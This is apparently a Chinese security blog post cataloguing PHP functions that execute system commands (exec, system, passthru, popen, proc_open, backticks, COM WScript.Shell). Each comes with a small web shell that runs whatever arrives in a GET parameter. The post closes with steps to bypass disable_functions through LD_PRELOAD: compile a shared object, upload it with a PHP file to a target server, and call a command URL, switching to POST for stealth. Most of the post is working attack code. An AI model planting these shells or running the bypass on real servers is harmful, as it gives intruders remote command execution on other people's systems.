**目录**

[PHP中执行系统命令](#t0 "PHP中执行系统命令")

[exec()](#t1 "exec()")

[shell\_exec()](#t2 "shell_exec()")

[system()](#t3 "system() ") 

[\`$command\`](#t4 "`$command`  ")

[passthru()](#t5 "passthru()")

[popen()](#t6 "popen()")

[proc\_open()](#t7 "proc_open()")

[COM组件](#t8 "COM组件")

* * *

PHP中执行系统命令
----------

在PHP中，执行系统命令，有以下方式或方法：

1.  exec()
2.  shell\_exec() 
3.  \`whoami\`
4.  system()
5.  passthru()
6.  popen()
7.  proc\_open()
8.  pcntl\_exec() ：需要开启pcntl扩展
9.  COM组件：Wscript.Shell和Shell.Application
10.  dl()：通过加载自定义php扩展突破 disable\_fucnitons指令的限制
11.  利用PHP内核变量绕过disable\_functions，传送门：[利用PHP内核变量绕过disable\_functions（附完整代码）](https://www.freebuf.com/articles/web/82801.html "利用PHP内核变量绕过disable_functions（附完整代码）")

### exec()

该函数默认返回值是执行结果的第一行，并不会有全部的执行结果。如果要打印执行结果，需遍历打印output数组。

```
string exec ( string command, array &output, int &return_var)      
    command参数是要执行的命令      
    output数组是保存输出结果      
    return_var整形用来保存命令执行后的状态码，0代表执行成功，1代表执行失败
```

```
<?php      
	$command=$_GET['command'];      
	$ret=exec($command,$output,$a);      
	echo $ret;					#默认只返回第一行结果      
	echo "<br>";      
	echo "****************************************************";      
	echo "<br>";      
	echo "Status: ",$a;			#打印出执行状态码      
	echo "<br>";      1
	echo "****************************************************";      1
	$length=count($output);		#数组的长度      1
	for($i=0;$i<$length;$i++){      1
		echo $output[$i];      1
		echo "<br>";      1
	}      1
?>
```


 ![](https://img-blog.csdnimg.cn/20200306221342377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### shell\_exec()

```
<?php      
	$command=$_GET['command'];      
	$ret=shell_exec($command);      
	echo $ret;      
?>
```


![](https://img-blog.csdnimg.cn/20200306221802702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### system() 

```
system(string  command , int & return_var)      
    command参数是要执行的命令，      
    return_var参数存放返回的值，可不写该参数
```

```
<?php      
	$command=$_GET['command'];      
	$ret=system($command);      
	echo $ret;      
?>
```


![](https://img-blog.csdnimg.cn/20200306221907621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### \`$command\`

```
<?php      
	$command=$_GET['command'];      
	$ret=`$command`;      
	echo $ret;      
?>
```


 ![](https://img-blog.csdnimg.cn/20200306222336878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### passthru()

```
<?php      
	$command=$_GET['command'];      
	passthru($command);      
?>
```


![](https://img-blog.csdnimg.cn/20200306222112649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### popen()

```
popen ( string command, string mode )      
    打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。
```

```
<?php      
	$command=$_GET['command'];      
	$fd = popen($command, 'r');       
	while($s=fgets($fd)){      
		print_r($s);      
	}      
?>
```


![](https://img-blog.csdnimg.cn/20200306223115648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### proc\_open()

```
resource proc_open ( string cmd, array descriptorspec, array &pipes [, string cwd [, array env [, array other_options]]] )
```

```
<?php      
	$command=$_GET['command'];      
    $descriptorspec=array(       
        0=>array('pipe','r'),       
        1=>array('pipe','w'),      
        2=>array('pipe','w')       
    );      
    $handle=proc_open($command,$descriptorspec,$pipes,NULL);      
    if(!is_resource($handle)){      1
    	die('proc_open failed');      1
    }      1
    while($s=fgets($pipes[1])){      1
    	print_r($s);      1
    }      1
    while($s=fgets($pipes[2])){      1
    	print_r($s);      1
    }      1
    fclose($pipes[0]);      1
    fclose($pipes[1]);      2
    fclose($pipes[2]);      2
    proc_close($handle);      2
?>
```


 ![](https://img-blog.csdnimg.cn/20200306223950711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### COM组件

php>5.4版本需手动添加该扩展

在php.ini文件中，加入如下这行

![](https://img-blog.csdnimg.cn/20200408210329365.png)

然后查看phpinfo，该扩展是否enable。

![](https://img-blog.csdnimg.cn/2020040821041777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

enable之后，就可以使用如下脚本了。

```
<?php      
$command=$_GET['cmd'];      
$wsh = new COM('WScript.shell');      
$exec = $wsh->exec("cmd /c ".$command);      
$stdout = $exec->StdOut();      
$stroutput = $stdout->ReadAll();      
echo $stroutput;      
?>
```


![](https://img-blog.csdnimg.cn/20200322221358921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果目标是Linux系统的话，可以参考：[GitHub - yangyangwithgnu/bypass\_disablefunc\_via\_LD\_PRELOAD: bypass disable\_functions via LD\_PRELOA (no need /usr/sbin/sendmail)](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD "GitHub - yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD: bypass disable_functions via LD_PRELOA  (no need /usr/sbin/sendmail)")

项目中现成的so文件可以如下编译

```
# x64      
gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so      
# x86      
gcc -shared  -m32 -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so
```


将php和so都上传到目标服务器后，访问如下即可执行命令

```
http://x.x.x.x/bypass_disablefunc.php?cmd=id&outpath=/var/www/html/xxx&sopath=/var/www/html/bypass_disablefunc_x64.so
```


备注：建议outpath和sopath同个目录，防止outpath没权限写，或者找到上传文件的目录，肯定有权限写的。 不推荐有GET，可以改成POST提交更安全。

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[php限制命令执行绕过（mail函数执行可以试试）](https://www.cnblogs.com/R4v3n/articles/9081202.html "php限制命令执行绕过（mail函数执行可以试试）")

                  [无需sendmail：巧用LD\_PRELOAD突破disable\_functions](https://www.freebuf.com/web/192052.html "无需sendmail：巧用LD_PRELOAD突破disable_functions")